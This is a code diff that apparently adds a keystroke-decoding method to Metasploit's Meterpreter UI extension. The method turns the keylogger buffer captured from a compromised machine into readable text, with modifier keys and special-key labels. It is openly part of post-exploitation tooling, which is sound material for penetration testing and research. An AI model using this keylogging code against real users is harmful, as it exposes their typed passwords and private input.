@@ -219,6 +219,38 @@ class UI < Rex::Post::UI
 		return response.get_tlv_value(TLV_TYPE_KEYS_DUMP);
 	end
 	
+	#
+	# Extract the keystroke from the buffer data
+	#
+	def keyscan_extract(buffer_data)
+		outp = ""
+		buffer_data.unpack("n*").each do |inp|
+			fl = (inp & 0xff00) >> 8
+			vk = (inp & 0xff)
+			kc = VirtualKeyCodes[vk]
+			
+			f_shift = fl & (1<<1)
+			f_ctrl  = fl & (1<<2)
+			f_alt   = fl & (1<<3)
+	
+			if(kc)
+				name = ((f_shift != 0 and kc.length > 1) ? kc[1] : kc[0])
+				case name
+				when /^.$/
+					outp << name
+				when /shift|click/i
+				when 'Space'
+					outp << " "
+				else
+					outp << " <#{name}> "
+				end
+			else
+				outp << " <0x%.2x> " % vk
+			end
+		end
+		return outp
+	end
+	
 protected
 	attr_accessor :client # :nodoc:
 
